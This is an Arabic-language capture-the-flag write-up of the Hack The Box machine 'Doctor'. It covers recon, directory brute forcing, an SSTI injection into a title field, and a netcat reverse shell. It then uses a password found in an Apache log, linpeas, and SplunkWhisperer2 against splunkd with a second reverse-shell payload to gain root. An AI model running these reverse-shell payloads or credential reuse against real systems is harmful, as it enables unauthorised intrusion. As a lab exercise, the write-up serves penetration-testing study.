#hacktbebox Doctor



 ![Desktop View](/img/doc/0.png)


```
Sammmry :
```


ssti نجد انها مصابة ب  web application اثناء فحص 

 shell نقوم باستغلالها للحصول على   

 بعد البحث داخل السيرفر نجد كلمة مرور نستخدمها

  user .txt للحصول على 

  splunckd نجد ان السيرفر منصب linpeas بعد تشغيل  

   نقوم باستغلالها لنحصل على صلاحيات
   
   root


- sammmry
- 1 Recon
   - 1.1 nmap
- 2 ffuf
- 3 port
   - 3.1 new user
- 4 user
   - 4.1 ssti exploit
   - 4.2 shell
   - 4.3 Backup file
   - 4.4 User shaun
- 5 Privilege escalation
   - 5.1 linpeas
   - 5.2 splunkd
   - 5.3 exploit




## 1 Recon

### 1.1 nmap

nmap نبدا بفحص البورتات باستخدام


 ![Desktop View](/img/doc/1.png)


نلاحظ وجود  البورت 80 مفتوح الخاص بالويب سيرفر

‫‪domain‬‬ بالإضافة  الى 

‫‪doctors.htb‬‬ ‫باسم‬

/etc/hosts نضعه في ملف


 ![Desktop View](/img/doc/2.png)

## 2 ffuf



 directory brute force نقوم بعمل 

 ffufباستخدام 


  ![Desktop View](/img/doc/3.png)



## 3 port


### 3.1 new user



نفتح الدومين نيم على المتصفح ثم نقوم بتسجيل مستخدم جديد 


 ![Desktop View](/img/doc/4.png)


## 4 user

### 4.1 ssti exploit


sstiنجد ثغرة aplication عند فحص

 {{ 7 * 7 }}نجرب الامر التالي

title في

 ![Desktop View](/img/doc/5.png)


htb/archive ثم نذهب الى 


7*7  نجد ناتج العملية 
‬

‫هو‫‪49  ‬‬




 هذا يدل على ان التطبيق مصاب ب

ssti

وهي ثغرة خطيرة 





واختراق السيرفر shell تمكننا من الحصول على


 ![Desktop View](/img/doc/6.png)



 نقوم الان بعملية الاستغلال


title وذلك بحقن البايلود الخاص بنا في

```
<img src=http://10.10.14.212/$(nc.traditional$IFS-
e$IFS/bin/bash$IFS'10.10.14.212'$IFS'4444')>
```
 10.10.14.212 ip غير

 ب الخاص بك

 : بالامر التالي netcat listenerنشغل

```
nc –lnvp 4444
```

البورت الخاص بك 4444


 ![Desktop View](/img/doc/7.png)



 ![Desktop View](/img/doc/8.png)

### 4.2 shell

 حصلنا على اتصال مع السيرفر الان


 ![Desktop View](/img/doc/9.png)


  ![Desktop View](/img/doc/10.png)


### 4.3 Backup file





في backupبالفحص داخل السيرفر نجد كلمة سر داخل ملف
/var/log/apache2 المسار


 ![Desktop View](/img/doc/11.png)

### 4.4 User shaun


 ![Desktop View](/img/doc/12.png)



اويمكنك ان تجلبهم من usersلنرى home نذهب الى ملف

/etc/passwd

ثم نقوم بالدخول باستخدام كلمة السر

Guitar123

su shaun


 ![Desktop View](/img/doc/13.png)



## 5 Privilege escalation

### 5.1 linpeas

على السيرفر يمكن ان تجده هنا LinPEAS نقوم برفع


```
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
```

 python web server نقوم بتشغيل 

: بالامر التالي


 ![Desktop View](/img/doc/14.png)

Python –m SimpleHTTPServer

‫ثم‬

```
wget http://10.10.10.14.212/linpas.sh
```


 10.10.14.212 ip غير

 ب الخاص بك


 ![Desktop View](/img/doc/15.png)


 ![Desktop View](/img/doc/16.png)

 ### 5.2 splunkd



 ![Desktop View](/img/doc/17.png)


نجد ان linpeasمن نتائج فحص

port 8089 على splunkd السيرفر منصب 




بالبحث في جوجل نجد اداة

splunkdتمكننا بالاتصال عبر 

```
git clone https://github.com/cnotin/SplunkWhisperer2
```


### 5.3 exploit

 ![Desktop View](/img/doc/18.png)


```
python --host 10.10.10.209 --lhost 10.10.14.212 --username shaun --password
Guitar123 --payload 'nc.traditional -e/bin/bash '10.10.14.212' '6666''
```


استبدل

ip 
10.10.14.212 

بالخاص بك 


 ![Desktop View](/img/doc/19.png)




 rootحصلنا على صلاحيات

